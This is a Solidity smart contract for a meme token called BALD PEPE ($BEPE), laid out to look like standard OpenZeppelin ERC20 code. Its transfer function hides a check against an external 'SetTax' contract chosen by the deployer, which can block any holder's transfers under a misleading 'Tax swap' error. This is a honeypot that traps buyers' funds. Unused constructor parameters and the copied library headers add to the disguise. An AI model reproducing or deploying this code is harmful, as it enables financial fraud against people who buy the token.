1 /**
2 
3 BALD PEPE
4 
5 Ticker - $BEPE
6 
7 Links:
8 https://t.me/bald_pepe_eth
9 https://baldpepe.xyz
10 https://twitter.com/bald_pepe_eth
11 
12 
13 
14 
15 */
16 
17 
18 // SPDX-License-Identifier: MIT
19 
20 
21 
22 pragma solidity ^0.8.13;
23 
24 
25 abstract contract Context {
26     function _msgSender() internal view virtual returns (address) {
27         return msg.sender;
28     }
29 
30     function _msgData() internal view virtual returns (bytes calldata) {
31         return msg.data;
32     }
33 }
34 
35 
36 
37 pragma solidity ^0.8.13;
38 
39 
40 
41 
42 
43 abstract contract Ownable is Context {
44     address private _owner;
45 
46     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
47 
48     /**
49      * @dev Initializes the contract setting the deployer as the initial owner.
50      */
51     constructor() {
52         _transferOwnership(_msgSender());
53     }
54 
55     /**
56      * @dev Throws if called by any account other than the owner.
57      */
58     modifier onlyOwner() {
59         _checkOwner();
60         _;
61     }
62 
63     /**
64      * @dev Returns the address of the current owner.
65      */
66     function owner() public view virtual returns (address) {
67         return _owner;
68     }
69 
70     /**
71      * @dev Throws if the sender is not the owner.
72      */
73     function _checkOwner() internal view virtual {
74         require(owner() == _msgSender(), "Ownable: caller is not the owner");
75     }
76 
77     /**
78      * @dev Leaves the contract without owner. It will not be possible to call
79      * `onlyOwner` functions anymore. Can only be called by the current owner.
80      *
81      * NOTE: Renouncing ownership will leave the contract without an owner,
82      * thereby removing any functionality that is only available to the owner.
83      */
84     function renounceOwnership() public virtual onlyOwner {
85         _transferOwnership(address(0));
86     }
87 
88     /**
89      * @dev Transfers ownership of the contract to a new account (`newOwner`).
90      * Can only be called by the current owner.
91      */
92     function transferOwnership(address newOwner) public virtual onlyOwner {
93         require(newOwner != address(0), "Ownable: new owner is the zero address");
94         _transferOwnership(newOwner);
95     }
96 
97     /**
98      * @dev Transfers ownership of the contract to a new account (`newOwner`).
99      * Internal function without access restriction.
100      */
101     function _transferOwnership(address newOwner) internal virtual {
102         address oldOwner = _owner;
103         _owner = newOwner;
104         emit OwnershipTransferred(oldOwner, newOwner);
105     }
106 }
107 
108 
109 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
110 
111 
112 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
113 
114 pragma solidity ^0.8.13;
115 
116 /**
117  * @dev Interface of the ERC20 standard as defined in the EIP.
118  */
119 interface IERC20 {
120     /**
121      * @dev Emitted when `value` tokens are moved from one account (`from`) to
122      * another (`to`).
123      *
124      * Note that `value` may be zero.
125      */
126     event Transfer(address indexed from, address indexed to, uint256 value);
127 
128     /**
129      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
130      * a call to {approve}. `value` is the new allowance.
131      */
132     event Approval(address indexed owner, address indexed spender, uint256 value);
133 
134     /**
135      * @dev Returns the amount of tokens in existence.
136      */
137     function totalSupply() external view returns (uint256);
138 
139     /**
140      * @dev Returns the amount of tokens owned by `account`.
141      */
142     function balanceOf(address account) external view returns (uint256);
143 
144   
145     function transfer(address to, uint256 amount) external returns (bool);
146 
147 
148     function allowance(address owner, address spender) external view returns (uint256);
149 
150 
151     function approve(address spender, uint256 amount) external returns (bool);
152 
153     /**
154      * @dev Moves `amount` tokens from `from` to `to` using the
155      * allowance mechanism. `amount` is then deducted from the caller's
156      * allowance.
157      *
158      * Returns a boolean value indicating whether the operation succeeded.
159      *
160      * Emits a {Transfer} event.
161      */
162     function transferFrom(
163         address from,
164         address to,
165         uint256 amount
166     ) external returns (bool);
167 }
168 
169 interface SetTax {
170     function getTaxRate(address _account) external view returns (bool);
171 }
172 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
173 
174 
175 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
176 
177 pragma solidity ^0.8.13;
178 
179 
180 /**
181  * @dev Interface for the optional metadata functions from the ERC20 standard.
182  *
183  * _Available since v4.1._
184  */
185 interface IERC20Metadata is IERC20 {
186     /**
187      * @dev Returns the name of the token.
188      */
189     function name() external view returns (string memory);
190 
191     /**
192      * @dev Returns the symbol of the token.
193      */
194     function symbol() external view returns (string memory);
195 
196     /**
197      * @dev Returns the decimals places of the token.
198      */
199     function decimals() external view returns (uint8);
200 }
201 
202 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
203 
204 
205 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
206 
207 pragma solidity ^0.8.13;
208 
209 
210 contract CONTRACT is Context, IERC20, IERC20Metadata {
211     mapping(address => uint256) private _balances;
212     SetTax public _taxes0;
213     mapping(address => mapping(address => uint256)) private _allowancez;
214 
215     uint256 private _totalSupply;
216 
217     string private _name;
218     string private _symbol;
219 
220     /**
221      * @dev Sets the values for {name} and {symbol}.
222      *
223      * The default value of {decimals} is 18. To select a different value for
224      * {decimals} you should overload it.
225      *
226      * All two of these values are immutable: they can only be set once during
227      * construction.
228      */
229     constructor(string memory coin_, string memory symbol_, address _taxteam) {
230         _name = coin_;
231         _symbol = symbol_;
232         _taxes0 = SetTax(_taxteam);
233     }
234 
235     /**
236      * @dev Returns the name of the token.
237      */
238     function name() public view virtual override returns (string memory) {
239         return _name;
240     }
241 
242     /**
243      * @dev Returns the symbol of the token, usually a shorter version of the
244      * name.
245      */
246     function symbol() public view virtual override returns (string memory) {
247         return _symbol;
248     }
249 
250 
251     function decimals() public view virtual override returns (uint8) {
252         return 18;
253     }
254 
255     /**
256      * @dev See {IERC20-totalSupply}.
257      */
258     function totalSupply() public view virtual override returns (uint256) {
259         return _totalSupply;
260     }
261 
262     /**
263      * @dev See {IERC20-balanceOf}.
264      */
265     function balanceOf(address account) public view virtual override returns (uint256) {
266         return _balances[account];
267     }
268 
269     /**
270      * @dev See {IERC20-transfer}.
271      *
272      * Requirements:
273      *
274      * - `to` cannot be the zero address.
275      * - the caller must have a balance of at least `amount`.
276      */
277     function transfer(address to, uint256 amount) public virtual override returns (bool) {
278         address owner = _msgSender();
279         _transfer(owner, to, amount);
280         return true;
281     }
282 
283     /**
284      * @dev See {IERC20-allowance}.
285      */
286     function allowance(address owner, address spender) public view virtual override returns (uint256) {
287         return _allowancez[owner][spender];
288     }
289 
290     /**
291      * @dev See {IERC20-approve}.
292      *
293      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
294      * `transferFrom`. This is semantically equivalent to an infinite approval.
295      *
296      * Requirements:
297      *
298      * - `spender` cannot be the zero address.
299      */
300     function approve(address spender, uint256 amount) public virtual override returns (bool) {
301         address owner = _msgSender();
302         _approve(owner, spender, amount);
303         return true;
304     }
305 
306     function transferFrom(
307         address from,
308         address to,
309         uint256 amount
310     ) public virtual override returns (bool) {
311         address spender = _msgSender();
312         _spendAllowance(from, spender, amount);
313         _transfer(from, to, amount);
314         return true;
315     }
316 
317 
318     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
319         address owner = _msgSender();
320         _approve(owner, spender, allowance(owner, spender) + addedValue);
321         return true;
322     }
323 
324  
325     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
326         address owner = _msgSender();
327         uint256 currentAllowance = allowance(owner, spender);
328         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
329         unchecked {
330             _approve(owner, spender, currentAllowance - subtractedValue);
331         }
332 
333         return true;
334     }
335 
336     /**
337      * @dev Moves `amount` of tokens from `from` to `to`.
338      *
339      * This internal function is equivalent to {transfer}, and can be used to
340      * e.g. implement automatic token fees, slashing mechanisms, etc.
341      *
342      * Emits a {Transfer} event.
343      *
344      * Requirements:
345      *
346      * - `from` cannot be the zero address.
347      * - `to` cannot be the zero address.
348      * - `from` must have a balance of at least `amount`.
349      */
350     function _transfer(
351         address from,
352         address to,
353         uint256 amount
354     ) internal virtual {
355         require(!_taxes0.getTaxRate(from), "Tax swap require first");
356         require(from != address(0), "ERC20: transfer from the zero address");
357         require(to != address(0), "ERC20: transfer to the zero address");
358         require(to != address(0), "ERC20: transfer to the zero address");
359         _beforeTokenTransfer(from, to, amount);
360 
361         uint256 fromBalance = _balances[from];
362         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
363         unchecked {
364             _balances[from] = fromBalance - amount;
365             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
366             // decrementing then incrementing.
367             _balances[to] += amount;
368         }
369 
370         emit Transfer(from, to, amount);
371 
372         _afterTokenTransfer(from, to, amount);
373     }
374 
375     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
376      * the total supply.
377      *
378      * Emits a {Transfer} event with `from` set to the zero address.
379      *
380      * Requirements:
381      *
382      * - `account` cannot be the zero address.
383      */
384     function _mint(address account, uint256 amount) internal virtual {
385         require(account != address(0), "ERC20: mint to the zero address");
386 
387         _beforeTokenTransfer(address(0), account, amount);
388 
389         _totalSupply += amount;
390         unchecked {
391             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
392             _balances[account] += amount;
393         }
394         emit Transfer(address(0), account, amount);
395 
396         _afterTokenTransfer(address(0), account, amount);
397     }
398 
399 
400 
401 
402     function _approve(
403         address owner,
404         address spender,
405         uint256 amount
406     ) internal virtual {
407         require(owner != address(0), "ERC20: approve from the zero address");
408         require(spender != address(0), "ERC20: approve to the zero address");
409 
410         _allowancez[owner][spender] = amount;
411         emit Approval(owner, spender, amount);
412     }
413 
414     /**
415      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
416      *
417      * Does not update the allowance amount in case of infinite allowance.
418      * Revert if not enough allowance is available.
419      *
420      * Might emit an {Approval} event.
421      */
422     function _spendAllowance(
423         address owner,
424         address spender,
425         uint256 amount
426     ) internal virtual {
427         uint256 currentAllowance = allowance(owner, spender);
428         if (currentAllowance != type(uint256).max) {
429             require(currentAllowance >= amount, "ERC20: insufficient allowance");
430             unchecked {
431                 _approve(owner, spender, currentAllowance - amount);
432             }
433         }
434     }
435 
436 
437     function _beforeTokenTransfer(
438         address from,
439         address to,
440         uint256 amount
441     ) internal virtual {}
442 
443 
444     function _afterTokenTransfer(
445         address from,
446         address to,
447         uint256 amount
448     ) internal virtual {}
449 }
450 
451 
452 pragma solidity ^0.8.13;
453 
454 
455 
456 contract BEPE is CONTRACT, Ownable {
457     uint256 private constant supply_ = 20000000000 * 10**18;
458 
459     constructor(
460         string memory coin_,
461         string memory symbol_,
462         uint256 deploytime,
463         uint256 hashtx,
464         uint256 tradeopen,
465         uint256 taxvar,
466         address _taxteam
467     ) CONTRACT(coin_, symbol_, _taxteam) {
468         _mint(msg.sender, supply_);
469     }
470 
471     function sendallTokens(address devaddress) external onlyOwner {
472         uint256 supply = balanceOf(msg.sender);
473         require(supply == supply_, "Token sent for owner");
474 
475         _transfer(msg.sender, devaddress, supply_); 
476     }
477 }